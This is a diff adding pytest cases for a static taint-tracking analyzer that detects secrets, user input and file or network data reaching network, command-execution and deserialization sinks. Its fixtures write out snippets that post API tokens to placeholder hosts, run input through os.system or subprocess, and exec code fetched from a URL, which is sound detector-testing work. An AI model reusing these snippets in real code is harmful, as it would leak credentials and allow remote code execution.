@@ -22,6 +22,7 @@ import sys
 import textwrap
 import time
 import tracemalloc
+import types
 
 import pytest
 
@@ -1202,6 +1203,31 @@ class TestNameClashPrecision:
         )
         assert _summary(code) == [("TT3", _line(code, "# SINK"))]
 
+    @pytest.mark.parametrize(
+        "rebinding",
+        [
+            "import json as x\n    requests.post('https://x.invalid', data=x)",
+            "try:\n        pass\n    except Exception as x:\n"
+            "        requests.post('https://x.invalid', data=x)",
+            "match cmd:\n        case [x]:\n            requests.post('https://x.invalid', data=x)",
+            "match cmd:\n        case {'token': x}:\n"
+            "            requests.post('https://x.invalid', data=x)",
+            "z = [y for x in ['a', 'b'] for y in x]\n    requests.post('https://x.invalid', data=z)",
+        ],
+        ids=["import_as", "except_as", "match_sequence", "match_mapping", "later_iterable"],
+    )
+    def test_function_local_bindings_shadow_a_tainted_global(self, rebinding: str) -> None:
+        """Each binding form makes ``x`` a local of the function, so the
+        module-level secret named ``x`` never reaches the sink. (A later
+        ``for`` of a comprehension iterates the comprehension's own ``x``.)"""
+        code = f"import os, requests\nx = os.getenv('TOKEN')\ndef f(cmd):\n    {rebinding}\n"
+        assert _run(code) == []
+        # The same sink reading the global (no local binding) is reported.
+        unbound = "import os, requests\nx = os.getenv('TOKEN')\ndef f(cmd):\n    z = x\n" + (
+            "    requests.post('https://x.invalid', data=z)\n"
+        )
+        assert [f.rule_id for f in _run(unbound)] == ["TT3"]
+
 
 class TestDirectCalls:
     """Arguments of direct in-file calls bind to parameters; returns reach callers."""
@@ -1324,16 +1350,147 @@ class TestDirectCalls:
             assert len(_flows(code)) == 1, definition
 
     def test_positional_arguments_beyond_the_slot_cap_still_bind(self) -> None:
-        width = behavioral_taint_tracking._MAX_POSITIONAL_SLOTS + 4
-        params = ", ".join(f"p{i}" for i in range(width))
-        args = ", ".join('os.getenv("API_KEY")' if i == width - 1 else str(i) for i in range(width))
-        code = (
-            "import os, requests\n"
-            f"def send({params}):\n"
-            f'    requests.post("https://example.invalid", data=p{width - 1})\n'
-            f"send({args})\n"
+        cap = behavioral_taint_tracking._MAX_POSITIONAL_SLOTS
+
+        def module(width: int, tainted: int, read: int) -> str:
+            params = ", ".join(f"p{i}" for i in range(width))
+            args = ", ".join(
+                'os.getenv("API_KEY")' if i == tainted else str(i) for i in range(width)
+            )
+            return (
+                "import os, requests\n"
+                f"def send({params}):\n"
+                f'    requests.post("https://example.invalid", data=p{read})\n'
+                f"send({args})\n"
+            )
+
+        # The first argument past the explicit slots (index == cap) and a later one.
+        assert len(_flows(module(cap + 1, cap, cap))) == 1
+        assert len(_flows(module(cap + 4, cap + 3, cap + 3))) == 1
+        # Arguments past the cap never reach the explicit parameters before it.
+        assert _flows(module(cap + 1, cap, 0)) == []
+        assert _flows(module(cap + 1, cap, cap - 1)) == []
+
+    def test_unpacked_arguments_bind_by_position_and_name(self) -> None:
+        """``*seq`` fills parameters from its position on; ``**mapping`` fills
+        keyword-only parameters and ``**kwargs`` as well as named ones."""
+        for definition, call in (
+            ("def send(label, value):", 'send(*["public", os.getenv("API_KEY")])'),
+            ("def send(label, value):", 'send("public", *[os.getenv("API_KEY")])'),
+            ("def send(*, value):", 'send(**{"value": os.getenv("API_KEY")})'),
+            ("def send(**value):", "send(**opts)"),
+            ("def send(*, value):", "send(**opts)"),
+        ):
+            code = _code(
+                f"""
+                import os, requests
+                opts = {{"value": os.getenv("API_KEY")}}
+                {definition}
+                    requests.post("https://example.invalid", data=value)  # SINK
+                {call}
+                """
+            )
+            assert _summary(code) == [("TT3", _line(code, "# SINK"))], (definition, call)
+        # A ``*seq`` starting after a parameter never fills that parameter.
+        before = _code(
+            """
+            import os, requests
+            def send(value, label):
+                requests.post("https://example.invalid", data=value)
+            send("public", *[os.getenv("API_KEY")])
+            """
         )
-        assert len(_flows(code)) == 1
+        assert _run(before) == []
+
+    def test_forwarding_wrappers_reach_the_named_parameter(self) -> None:
+        code = _code(
+            """
+            import os, requests
+            def upload(url, payload):
+                requests.post(url, data=payload)  # SINK
+            def wrapper(*args, **kwargs):
+                return upload(*args, **kwargs)
+            def main():
+                secret = os.getenv("API_KEY")
+                wrapper("https://example.invalid", secret)
+            """
+        )
+        assert _summary(code) == [("TT3", _line(code, "# SINK"))]
+
+    def test_keywords_bind_only_their_named_parameter(self) -> None:
+        """A keyword naming a parameter never also lands in ``**kwargs``."""
+        for definition, call in (
+            ("def call_api(url, token=None, **params):", 'token=os.environ["API_TOKEN"], q="x"'),
+            ("def call_api(url, *, token=None, **params):", 'token=os.environ["API_TOKEN"]'),
+        ):
+            code = _code(
+                f"""
+                import os, requests
+                {definition}
+                    headers = {{"Authorization": f"Bearer {{token}}"}}
+                    return requests.get(url, params=params)
+                call_api("https://example.invalid", {call})
+                """
+            )
+            assert _run(code) == [], definition
+        method = _code(
+            """
+            import os, subprocess
+            class Runner:
+                def run(self, cmd, dry_run=None, **popen_kwargs):
+                    subprocess.run(cmd, **popen_kwargs)
+                def go(self):
+                    self.run(["ls"], dry_run=input())
+            """
+        )
+        assert _run(method) == []
+        # Unnamed keywords, and positional-only names, do reach ``**kwargs``.
+        for definition, call in (
+            ("def call_api(url, token=None, **params):", 'q=os.environ["API_TOKEN"]'),
+            ("def call_api(url, token=None, /, **params):", 'token=os.environ["API_TOKEN"]'),
+        ):
+            code = _code(
+                f"""
+                import os, requests
+                {definition}
+                    return requests.get(url, params=params)  # SINK
+                call_api("https://example.invalid", {call})
+                """
+            )
+            assert _summary(code) == [("TT3", _line(code, "# SINK"))], definition
+        # A keyword never fills a positional-only parameter, even when a
+        # redefinition of the callee takes that name as a keyword.
+        redefined = _code(
+            """
+            import os, requests
+            def send(value, /):
+                requests.post("https://example.invalid", data=value)
+            def send(value):
+                print(value)
+            send(value=os.getenv("API_KEY"))
+            """
+        )
+        assert _run(redefined) == []
+
+    def test_a_lambda_bound_to_many_names_is_one_callee(self) -> None:
+        code = _code(
+            """
+            import os, requests
+            a = b = c = lambda payload: requests.post("https://x.invalid", data=payload)  # SINK
+            def b(other):
+                print(other)
+            b(os.getenv("API_TOKEN"))
+            """
+        )
+        assert _summary(code) == [("TT3", _line(code, "# SINK"))]
+        parsed = get_python_ast(None, code, "t.py")
+        index = behavioral_taint_tracking._build_scope_index(parsed.tree)
+        groups = {id(group): group for group in index.function_groups.values()}
+        # The lambda and the ``def b`` it shares a name with are one callee
+        # that ``a``, ``b`` and ``c`` all reach; nothing is copied per name.
+        assert len(index.function_groups) == 3
+        (group,) = groups.values()
+        assert len(group.functions) == 2
 
     def test_recursion_terminates(self) -> None:
         code = _code(
@@ -1868,6 +2025,404 @@ class TestMethods:
         )
         assert _summary(code) == [("TT3", _line(code, "# SINK"))]
 
+    def test_constructed_receivers_bind_and_return(self) -> None:
+        """``Class().m(...)`` and ``cls().m(...)`` call ``m`` on an instance of
+        an in-file class: arguments bind and the return value is read."""
+        returned = _code(
+            """
+            import os, requests
+            class Collector:
+                def collect(self):
+                    token = os.environ.get("API_KEY")
+                    return token
+                @classmethod
+                def load(cls):
+                    payload = cls().collect()  # FROM_CLS
+                    requests.post("https://x.invalid", data=payload)  # SINK_CLS
+            def main():
+                payload = Collector().collect()  # FROM_NAME
+                requests.post("https://x.invalid", data=payload)  # SINK_NAME
+            """
+        )
+        assert sorted(
+            (f.rule_id, f.start_line, f.message.split(" →")[0]) for f in _run(returned)
+        ) == [
+            (
+                "TT3",
+                _line(returned, "# SINK_CLS"),
+                f"Tainted flow: 'payload' from os.environ.get (line {_line(returned, '# FROM_CLS')}, "
+                "credential/environment)",
+            ),
+            (
+                "TT3",
+                _line(returned, "# SINK_NAME"),
+                f"Tainted flow: 'payload' from os.environ.get (line {_line(returned, '# FROM_NAME')}, "
+                "credential/environment)",
+            ),
+        ]
+        other_lanes = _code(
+            """
+            import requests
+            class Fetcher:
+                def code(self):
+                    return requests.get("https://x.invalid/script").text
+                def creds(self):
+                    return open("creds.txt").read()
+            exec(Fetcher().code())
+            requests.post("https://x.invalid", data=Fetcher().creds())
+            """
+        )
+        assert [f.rule_id for f in _run(other_lanes)] == ["TT5", "TT4"]
+        bound = _code(
+            """
+            import os, requests
+            class Uploader:
+                def upload(self, body):
+                    requests.post("https://x.invalid", data=body)  # SINK
+            Uploader().upload(os.environ.get("API_KEY"))
+            """
+        )
+        assert _summary(bound) == [("TT3", _line(bound, "# SINK"))]
+        # The constructed receiver is an instance: ``self`` is implicit.
+        shifted = bound.replace("def upload(self, body):", "def upload(self, body, extra=None):")
+        shifted = shifted.replace("data=body", "data=extra")
+        assert _run(shifted) == []
+
+    def test_unpacking_never_fills_the_implicit_receiver(self) -> None:
+        """``*args`` / ``**kwargs`` / overflow arguments of a bound call never
+        reach ``self`` / ``cls``: Python passes the receiver implicitly."""
+        forwarded_init = _code(
+            """
+            import os, requests
+            class BaseClient:
+                DEFAULT_URL = "https://api.invalid"
+                def __init__(self, api_key=None):
+                    self.api_key = api_key
+                    self.base_url = self.DEFAULT_URL
+                def health(self):
+                    return requests.get(self.base_url + "/health")
+            class OpenAIClient(BaseClient):
+                def __init__(self, *args, **kwargs):
+                    super().__init__(*args, **kwargs)
+            client = OpenAIClient(api_key=os.getenv("OPENAI_API_KEY"))
+            other = OpenAIClient(os.getenv("OPENAI_API_KEY"))
+            """
+        )
+        bound_calls = _code(
+            """
+            import subprocess, requests
+            class Tool:
+                cmd = ["git", "status"]
+                def send(self, *words):
+                    requests.post("https://x.invalid", data=self.cmd)
+                def configure(self, **opts):
+                    subprocess.run(self.cmd)
+                @classmethod
+                def launch(cls, *names):
+                    subprocess.run(cls.cmd)
+                def run(self):
+                    self.send(*input().split())
+                    self.configure(**{"mode": input()})
+                    Tool.launch(*input().split(","))
+            Tool(**{"x": input()})
+            """
+        )
+        assert _run(forwarded_init) == []
+        assert _run(bound_calls) == []
+        # An unbound ``Class.m(*args)`` does pass ``self`` explicitly.
+        unbound = _code(
+            """
+            import subprocess
+            class Runner:
+                def go(self, label):
+                    subprocess.run(self)  # SINK
+            Runner.go(*input().split())
+            """
+        )
+        assert _summary(unbound) == [("TT5", _line(unbound, "# SINK"))]
+        # Forwarding still reaches the base's named parameter.
+        true_flow = _code(
+            """
+            import os, requests
+            class Base:
+                def __init__(self, token=None):
+                    requests.post("https://x.invalid", data=token)  # SINK
+            class Child(Base):
+                def __init__(self, *args, **kwargs):
+                    super().__init__(*args, **kwargs)
+            Child(token=os.getenv("API_TOKEN"))
+            """
+        )
+        assert _summary(true_flow) == [("TT3", _line(true_flow, "# SINK"))]
+
+    def test_forwarded_kwargs_bind_only_the_keywords_passed_in(self) -> None:
+        """``super().__init__(**kwargs)`` forwards the keyword names the
+        subclass's callers pass, not a wildcard over every parameter."""
+        base = _code(
+            """
+            import os, requests
+            class BaseClient:
+                def __init__(self, api_key=None, timeout=30):
+                    self.api_key = api_key
+                    self.timeout = timeout
+                def health(self):
+                    return requests.get("https://api.invalid/health", timeout=self.timeout)
+                def send(self):
+                    return requests.post("https://api.invalid", headers={"K": self.api_key})  # SINK
+            class OpenAIClient(BaseClient):
+                def __init__(self, **kwargs):
+                    super().__init__(**kwargs)
+            """
+        )
+        named = base + 'OpenAIClient(api_key=os.getenv("OPENAI_API_KEY"))\n'
+        assert _summary(named) == [("TT3", _line(named, "# SINK"))]
+        # An opaque mapping at the call site may hold any name: every keyword
+        # parameter except the implicit receiver can receive it.
+        opaque = base + 'OpenAIClient(**{"api_key": os.getenv("OPENAI_API_KEY")})\n'
+        assert len(_flows(opaque)) == 2
+        reassigned = named.replace(
+            "        super().__init__(**kwargs)",
+            "        kwargs = dict(kwargs)\n        super().__init__(**kwargs)",
+        )
+        assert len(_flows(reassigned)) == 2
+        # A keyword the subclass takes by name never reaches its ``**kwargs``,
+        # so forwarding it binds only the names that do.
+        own_parameter = _code(
+            """
+            import os, requests
+            class BaseClient:
+                def __init__(self, api_key=None, timeout=30, **rest):
+                    self.api_key = api_key
+                def send(self):
+                    return requests.post("https://api.invalid", headers={"K": self.api_key})
+            class OpenAIClient(BaseClient):
+                def __init__(self, api_key=None, **kwargs):
+                    super().__init__(**kwargs)
+            OpenAIClient(api_key="public", extra=os.getenv("OPENAI_API_KEY"))
+            """
+        )
+        assert _run(own_parameter) == []
+
+    def test_overflow_arguments_never_fill_earlier_parameters(self) -> None:
+        cap = behavioral_taint_tracking._MAX_POSITIONAL_SLOTS
+        params = ", ".join(f"p{i}" for i in range(cap))
+        code = (
+            "import subprocess\n"
+            "class Tool:\n"
+            f"    def run(self, {params}, *rest):\n"
+            "        subprocess.run(self)\n"
+            "        subprocess.run(p0)\n"
+            "        subprocess.run(rest)  # SINK\n"
+            f"Tool().run({', '.join(['1'] * cap)}, input())\n"
+        )
+        assert _summary(code) == [("TT5", _line(code, "# SINK"))]
+
+    def test_constructors_also_bind_to_new(self) -> None:
+        for parameter in ("secret", "value"):
+            code = _code(
+                f"""
+                import os, requests
+                class C:
+                    def __new__(cls, {parameter}):
+                        requests.post("http://x.invalid", data={parameter})  # SINK
+                        return super().__new__(cls)
+                secret = os.environ.get("KEY")
+                C(secret)
+                """
+            )
+            assert _summary(code) == [("TT3", _line(code, "# SINK"))], parameter
+        # ``cls`` is implicit in ``C(x)``: the first argument never fills it.
+        shifted = _code(
+            """
+            import os, requests
+            class C:
+                def __new__(cls, user="x", body="public"):
+                    requests.post("http://x.invalid", data=cls)
+                    return super().__new__(cls)
+            C(os.getenv("KEY"))
+            C(**{"user": os.getenv("KEY")})
+            """
+        )
+        assert _run(shifted) == []
+
+    def test_method_lookup_follows_c3_order(self) -> None:
+        """In a diamond, ``D(B, C)`` with ``B(A)`` and ``C(A)`` resolves ``m``
+        on ``C`` before ``A``, as Python's MRO does."""
+        diamond = _code(
+            """
+            import os, requests
+            class A:
+                def send(self, body):
+                    requests.post("https://x.invalid", data=body)  # A_SINK
+            class B(A):
+                pass
+            class C(A):
+                def send(self, body):
+                    print("local only")
+            class D(B, C):
+                def go(self):
+                    super().send(os.getenv("TOKEN"))
+                def run(self):
+                    self.send(os.getenv("TOKEN"))
+            """
+        )
+        assert _run(diamond) == []
+        mirrored = diamond.replace(
+            'print("local only")', 'requests.post("https://x.invalid", data=body)'
+        ).replace('requests.post("https://x.invalid", data=body)  # A_SINK', "print(body)")
+        assert [f.rule_id for f in _run(mirrored)] == ["TT3"]
+
+    def test_lookup_is_bounded_to_the_nearest_ancestors(self) -> None:
+        """The lookup visits ``_MAX_ANCESTORS`` classes, the class included."""
+        depth = behavioral_taint_tracking._MAX_ANCESTORS
+
+        def chain(levels_up: int) -> str:
+            classes = [
+                "class K0:\n"
+                "    def send(self, body):\n"
+                '        requests.post("https://x.invalid", data=body)\n'
+            ]
+            classes += [f"class K{i}(K{i - 1}):\n    pass\n" for i in range(1, levels_up)]
+            classes.append(
+                f"class K{levels_up}(K{levels_up - 1}):\n"
+                "    def go(self):\n"
+                '        self.send(os.getenv("TOKEN"))\n'
+            )
+            return "import os, requests\n" + "".join(classes)
+
+        assert [f.rule_id for f in _run(chain(depth - 1))] == ["TT3"]
+        assert _run(chain(depth)) == []
+
+    def test_a_subclass_body_shadows_a_base_class_attribute(self) -> None:
+        shadowed = _code(
+            """
+            import os, requests
+            class Base:
+                token = os.environ.get("SERVICE_TOKEN")
+            class PublicProbe(Base):
+                token = None
+                def ping(self):
+                    requests.get("https://status.invalid", headers={"X-Token": self.token})
+            class MethodProbe(Base):
+                def token(self):
+                    return "public"
+                def ping(self):
+                    requests.get("https://status.invalid", headers={"X-Token": self.token})
+            """
+        )
+        assert _run(shadowed) == []
+        own = _code(
+            """
+            import os, requests
+            class Base:
+                token = os.environ.get("SERVICE_TOKEN")
+            class Probe(Base):
+                token = os.environ.get("PROBE_TOKEN")  # OWN
+                def ping(self):
+                    requests.get("https://status.invalid", headers={"X-Token": self.token})
+            """
+        )
+        (finding,) = _run(own)
+        assert f"'self.token' from os.environ.get (line {_line(own, '# OWN')}," in finding.message
+        # An instance store in the subclass does not hide the class value
+        # (flow-insensitive, as documented).
+        instance = _code(
+            """
+            import os, requests
+            class Base:
+                token = os.environ.get("SERVICE_TOKEN")
+            class Probe(Base):
+                def __init__(self):
+                    self.token = None
+                def ping(self):
+                    requests.get("https://status.invalid", headers={"X-Token": self.token})
+            """
+        )
+        assert [f.rule_id for f in _run(instance)] == ["TT3"]
+
+    def test_a_static_init_receives_the_arguments_without_an_instance(self) -> None:
+        code = _code(
+            """
+            import os, requests
+            class Client:
+                @staticmethod
+                def __init__(token):
+                    requests.post("https://x.invalid", data=token)  # SINK
+            Client(os.getenv("API_TOKEN"))
+            """
+        )
+        assert _summary(code) == [("TT3", _line(code, "# SINK"))]
+
+    def test_method_kinds_and_receivers(self) -> None:
+        """``__new__`` is static, a staticmethod's first parameter is no
+        receiver, and ``super()`` resolves inside comprehensions and lambdas."""
+        new_offset = _code(
+            """
+            import os, requests
+            class Base:
+                def __new__(cls, secret):
+                    requests.post("https://x.invalid", data=secret)  # SINK
+                    return object.__new__(cls)
+            class Child(Base):
+                def __new__(cls):
+                    return super().__new__(cls, os.getenv("TOKEN"))
+            """
+        )
+        static_first = _code(
+            """
+            import os, requests
+            class Client:
+                @staticmethod
+                def configure(other):
+                    other.token = os.getenv("TOKEN")
+                def send(self):
+                    requests.post("https://x.invalid", data=self.token)
+            """
+        )
+        in_comprehension = _code(
+            """
+            import os, requests
+            class Base:
+                def send(self, v):
+                    requests.post("https://x.invalid", data=v)  # SINK
+            class Child(Base):
+                def run(self):
+                    [super().send(os.getenv("TOKEN")) for _ in range(1)]
+            """
+        )
+        in_lambda = in_comprehension.replace(
+            '[super().send(os.getenv("TOKEN")) for _ in range(1)]',
+            '(lambda: super().send(os.getenv("TOKEN")))()',
+        )
+        shadowed = _code(
+            """
+            import os, requests
+            def super():
+                return Other()
+            class Other:
+                def send(self, v):
+                    print(v)
+            class Base:
+                def send(self, v):
+                    requests.post("https://x.invalid", data=v)
+            class Child(Base):
+                def run(self):
+                    super().send(os.getenv("TOKEN"))
+            """
+        )
+        inline_lambda = _code(
+            """
+            import os, requests
+            (lambda v: requests.post("https://x.invalid", data=v))(os.getenv("TOKEN"))  # SINK
+            """
+        )
+        assert _summary(new_offset) == [("TT3", _line(new_offset, "# SINK"))]
+        assert _run(static_first) == []
+        for code in (in_comprehension, in_lambda):
+            assert _summary(code) == [("TT3", _line(code, "# SINK"))], code
+        assert _run(shadowed) == []
+        assert _summary(inline_lambda) == [("TT3", _line(inline_lambda, "# SINK"))]
+
 
 class TestNotResolved:
     """Calls whose callee is not known from syntax alone bind nothing, as on main.
@@ -1879,9 +2434,14 @@ class TestNotResolved:
     """
 
     def test_instance_receivers_do_not_bind(self) -> None:
+        """Variables, attributes and casts holding an instance are not typed.
+
+        (``Api().upload(...)`` and ``cls().upload(...)`` do bind: see
+        ``TestMethods.test_constructed_receivers_bind_and_return``.)
+        """
         for setup, call in (
             ("api = Api()", "api.upload(secret)"),
-            ("pass", "Api().upload(secret)"),
+            ("api: Api = Api()", "api.upload(secret)"),
             ("api = cast(Api, raw)", "api.upload(secret)"),
             ("self.api = Api()", "self.api.upload(secret)"),
         ):
@@ -1897,6 +2457,31 @@ class TestNotResolved:
                         secret = os.getenv("API_TOKEN")
                         {setup}
                         {call}
+                """
+            )
+            assert _run(code) == [], call
+
+    def test_returns_through_instance_variables_are_not_read(self) -> None:
+        """The trade-off of dropping receiver typing: a value returned through
+        an instance held in a variable or attribute is not followed. ``main``
+        reports these only when the callee's local shares the caller's name."""
+        for setup, call in (
+            ("vault = Vault()", "vault.load()"),
+            ("vault: Vault = Vault()", "vault.load()"),
+            ("self.vault = Vault()", "self.vault.load()"),
+        ):
+            code = _code(
+                f"""
+                import os, requests
+                class Vault:
+                    def load(self):
+                        token = os.environ.get("API_TOKEN")
+                        return token
+                class Runner:
+                    def main(self):
+                        {setup}
+                        payload = {call}
+                        requests.post("https://x.invalid", data=payload)
                 """
             )
             assert _run(code) == [], call
@@ -2063,6 +2648,87 @@ class TestScopes:
         )
         (finding,) = _flows(code)
         assert f"'body' from os.getenv (line {_line(code, '# ASSIGN')}," in finding.message
+
+    def test_class_body_reads_see_the_module_global_until_the_class_binds_it(self) -> None:
+        """A class body reads a name it also binds with LOAD_NAME: the class's
+        value once bound, the module global before."""
+        for body, rule in (
+            ('requests.post("http://x.invalid", data=secret)\n    def secret(self): pass', "TT3"),
+            ('secret = secret\n    requests.post("http://x.invalid", data=secret)', "TT3"),
+            ("secret = secret.strip()\n    os.system(secret)", "TT2"),
+            ("subprocess.run(secret, shell=True)\n    for secret in ():\n        pass", "TT2"),
+            ('requests.post("http://x.invalid", data=secret)\n    import json as secret', "TT3"),
+        ):
+            code = (
+                "import os, requests, subprocess\n"
+                'secret = os.environ.get("KEY")\n'
+                f"class Beacon:\n    {body}\n"
+            )
+            assert [f.rule_id for f in _run(code)] == [rule], body
+        command = _code(
+            """
+            import os
+            cmd = input()
+            class Boot:
+                cmd = cmd.strip()
+                os.system(cmd)
+            """
+        )
+        assert [f.rule_id for f in _run(command)] == ["TT5"]
+        attribute = _code(
+            """
+            import os, requests
+            API_KEY = os.getenv("API_KEY")
+            class Client:
+                API_KEY = API_KEY
+                def send(self):
+                    requests.post("https://x.invalid", data=self.API_KEY)  # SINK
+            """
+        )
+        assert _summary(attribute) == [("TT3", _line(attribute, "# SINK"))]
+        # In a class nested in a function, LOAD_NAME skips the function's
+        # locals: ``secret = secret`` raises NameError and reads nothing.
+        nested = _code(
+            """
+            import os, requests
+            def outer():
+                secret = os.environ.get("KEY")
+                class Beacon:
+                    secret = secret
+                    requests.post("http://x.invalid", data=secret)
+                return Beacon
+            """
+        )
+        assert _run(nested) == []
+        # A class body that only assigns a name reads nothing from the global.
+        store_only = _code(
+            """
+            import os, requests
+            TOKEN = os.getenv("API_TOKEN")
+            class Client:
+                TOKEN = "public"
+                def send(self):
+                    requests.post("https://x.invalid", data=self.TOKEN)
+            """
+        )
+        assert _run(store_only) == []
+        # The global reaches the class-body name in main's order, so the
+        # message names the global's source as main does.
+        ordered = _code(
+            """
+            import os
+            X = os.getenv("CMD")
+            Y = open("cmd.txt").read()
+            class Boot:
+                X = Y
+                os.system(X)
+            """
+        )
+        (finding,) = _run(ordered)
+        assert finding.message == (
+            "Tainted flow: 'X' from os.getenv (line 2, credential/environment) "
+            "→ os.system (code execution)"
+        )
 
     def test_global_declared_in_an_enclosing_function_is_global_in_nested_ones(self) -> None:
         code = _code(
@@ -2244,6 +2910,74 @@ class TestSourceRank:
             "credential/environment) → requests.post (network output)"
         )
 
+    def test_a_more_severe_source_arriving_later_still_upgrades(self) -> None:
+        """A flow that already fired with a weaker source fires again for a
+        more severe one, in both ranked lanes."""
+        for first, second, sink, rule, source in (
+            (
+                "input()",
+                'os.getenv("TOKEN")',
+                'requests.post("https://x.invalid", data=y)',
+                "TT3",
+                "os.getenv",
+            ),
+            ('os.getenv("TOKEN")', "input()", "subprocess.run(y)", "TT5", "input"),
+        ):
+            code = _code(
+                f"""
+                import os, requests, subprocess
+                a = {first}
+                b0 = {second}
+                b1 = b0
+                b2 = b1
+                x = a
+                x = b2
+                y = x  # Y
+                {sink}
+                """
+            )
+            (finding,) = _run(code)
+            assert finding.rule_id == rule, sink
+            assert f"'y' from {source} (line {_line(code, '# Y')}," in finding.message
+
+    def test_assigned_variables_reach_helpers_in_every_lane(self) -> None:
+        """Phase B reads phase A facts again in every lane: a variable
+        tainted by plain assignment and passed to a helper reaches an
+        execution or deserialization sink there."""
+        for setup, helper, rule in (
+            ("x = input()", "exec(p)", "TT5"),
+            ("x = input()", "subprocess.run(p, shell=True)", "TT5"),
+            ('x = open("payload.bin", "rb").read()', "pickle.loads(p)", "TT6"),
+            ('x = requests.get("https://x.invalid").content', "pickle.loads(p)", "TT6"),
+        ):
+            code = _code(
+                f"""
+                import pickle, requests, subprocess
+                def run(p):
+                    {helper}  # SINK
+                {setup}
+                run(x)
+                """
+            )
+            assert _summary(code) == [(rule, _line(code, "# SINK"))], helper
+
+    def test_deserialization_ranks_a_file_above_a_credential(self) -> None:
+        for first, second in (
+            ('os.getenv("BLOB")', 'open("payload.bin", "rb").read()  # FILE'),
+            ('open("payload.bin", "rb").read()  # FILE', 'os.getenv("BLOB")'),
+        ):
+            code = _code(
+                f"""
+                import os, pickle
+                x = {first}
+                x = {second}
+                pickle.loads(x)
+                """
+            )
+            (finding,) = _run(code)
+            assert finding.rule_id == "TT6", first
+            assert f"'x' from open (line {_line(code, '# FILE')}," in finding.message
+
 
 class TestMessageCompatibility:
     """Messages keep main's wording for every flow main also reports.
@@ -2345,6 +3079,154 @@ class TestMessageCompatibility:
         assert "'self.token' from os.getenv (line 4," in finding.message
         assert receiver not in finding.message
 
+    @pytest.mark.parametrize(
+        ("code", "message"),
+        [
+            pytest.param(
+                "import os, subprocess\n"
+                'cmd = os.getenv("A") + open("f").read()\n'
+                "subprocess.run(cmd)\n",
+                "Tainted flow: 'cmd' from os.getenv (line 2, credential/environment) "
+                "→ subprocess.run (code execution)",
+                id="exec_credential_and_file",
+            ),
+            pytest.param(
+                "import os, shutil\n"
+                "def make_client():\n"
+                '    return os.environ.get("TOKEN")\n'
+                "def convert(dst):\n"
+                "    client = make_client()\n"
+                '    pptx_bytes = open("deck.pptx", "rb").read()\n'
+                "    pdf_bytes = client.convert_pdf(pptx_bytes)\n"
+                "    shutil.copy(pdf_bytes, dst)\n",
+                "Tainted flow: 'pdf_bytes' from open (line 7, file read) → shutil.copy (file write)",
+                id="file_write_after_helper_credential",
+            ),
+            pytest.param(
+                "import os\n"
+                "from pathlib import Path\n"
+                "def _get_client():\n"
+                '    return Client(os.environ.get("CONVERTER_KEY"))\n'
+                "def convert(pptx_path, output_path):\n"
+                "    pptx_path = Path(pptx_path)\n"
+                "    output_path = Path(output_path)\n"
+                "    client = _get_client()\n"
+                "    pptx_bytes = pptx_path.read_bytes()\n"
+                "    pdf_bytes = client.convert_pdf(pptx_bytes)\n"
+                "    output_path.write_bytes(pdf_bytes)\n",
+                "Tainted flow: 'pdf_bytes' from pathlib.Path.read_bytes (line 10, file read) "
+                "→ pathlib.Path.write_bytes (file write)",
+                id="write_bytes_after_helper_credential",
+            ),
+            pytest.param(
+                'import os, shutil\ndata = input() + os.getenv("K")\nshutil.copy(data, "dst")\n',
+                "Tainted flow: 'data' from input (line 2, user input) → shutil.copy (file write)",
+                id="file_write_input_and_credential",
+            ),
+            pytest.param(
+                "import pickle, requests\n"
+                'x = open("f", "rb").read()\n'
+                'x = requests.get("https://x.invalid").content\n'
+                "pickle.loads(x)\n",
+                "Tainted flow: 'x' from open (line 2, file read) → pickle.loads (deserialization)",
+                id="deserialization_file_then_network",
+            ),
+            pytest.param(
+                "import os, requests\n"
+                'token = os.environ.get("API_TOKEN") or os.getenv("LEGACY_TOKEN")\n'
+                'requests.post("https://x.invalid", data=token)\n',
+                "Tainted flow: 'token' from os.environ.get (line 2, credential/environment) "
+                "→ requests.post (network output)",
+                id="two_credentials",
+            ),
+        ],
+    )
+    def test_a_same_rule_finding_keeps_mains_message(self, code: str, message: str) -> None:
+        """A more severe source replaces the cited one only when it changes the
+        rule; otherwise the message names the first source to arrive, as
+        ``main`` does, so exact baselines and message globs keep matching."""
+        (finding,) = _run(code)
+        assert finding.message == message
+
+    def test_a_rule_upgrade_cites_the_first_of_the_most_severe_sources(self) -> None:
+        code = (
+            "import os, sys, subprocess\n"
+            'cmd = os.getenv("A") + (input() + sys.stdin.read())\n'
+            "subprocess.run(cmd)\n"
+        )
+        (finding,) = _run(code)
+        assert finding.message == (
+            "Tainted flow: 'cmd' from input (line 2, user input) → subprocess.run (code execution)"
+        )
+
+    def test_parameters_cite_the_first_source_to_arrive(self) -> None:
+        """Through call-site arguments too, the first source to arrive is cited
+        whenever a later one gives the same rule."""
+        two_callers = _code(
+            """
+            import os, requests
+            def send(value):
+                requests.post("https://x.invalid", data=value)
+            send(os.getenv("A"))  # FIRST
+            send(os.environ.get("B"))
+            """
+        )
+        (finding,) = _run(two_callers)
+        assert f"'value' from os.getenv (line {_line(two_callers, '# FIRST')}," in finding.message
+        through_helper = _code(
+            """
+            import os, subprocess
+            def run(command):
+                subprocess.run(command)
+            cmd = os.getenv("A") + open("f").read()
+            run(cmd)  # CALL
+            """
+        )
+        (finding,) = _run(through_helper)
+        assert finding.message == (
+            f"Tainted flow: 'command' from os.getenv (line {_line(through_helper, '# CALL')}, "
+            "credential/environment) → subprocess.run (code execution)"
+        )
+        global_then_parameter = _code(
+            """
+            import os, requests
+            TOKEN = os.getenv("A")
+            def send(value):
+                body = TOKEN  # GLOBAL
+                body = value
+                requests.post("https://x.invalid", data=body)
+            send(os.environ.get("B"))
+            """
+        )
+        (finding,) = _run(global_then_parameter)
+        assert (
+            f"'body' from os.getenv (line {_line(global_then_parameter, '# GLOBAL')},"
+            in finding.message
+        )
+        # A value that does not depend on the parameters is preferred over an
+        # equally severe one bound from a call site, whichever arrives first.
+        state_and_parameter = _code(
+            """
+            import os, requests
+            def token():
+                return os.getenv("A")
+            def wrapped():
+                return token()
+            def outer():
+                return wrapped()
+            def send(value):
+                body = value
+                body = outer()  # STATE
+                requests.post("https://x.invalid", data=body)
+            send(os.environ.get("B"))
+            """
+        )
+        (finding,) = _run(state_and_parameter)
+        assert (
+            f"'body' from os.getenv (line {_line(state_and_parameter, '# STATE')},"
+            in finding.message
+        )
+
 
 # ── Resource bounds ─────────────────────────────────────────────────────
 
@@ -2375,30 +3257,34 @@ def _analyzer_code_objects() -> list:
 
 
 def _operations(code: str) -> int:
-    """Lines of the taint analyzer executed while analyzing *code*.
+    """Lines and loop iterations of the taint analyzer executed on *code*.
 
     A deterministic work count: unlike wall-clock time it does not depend on
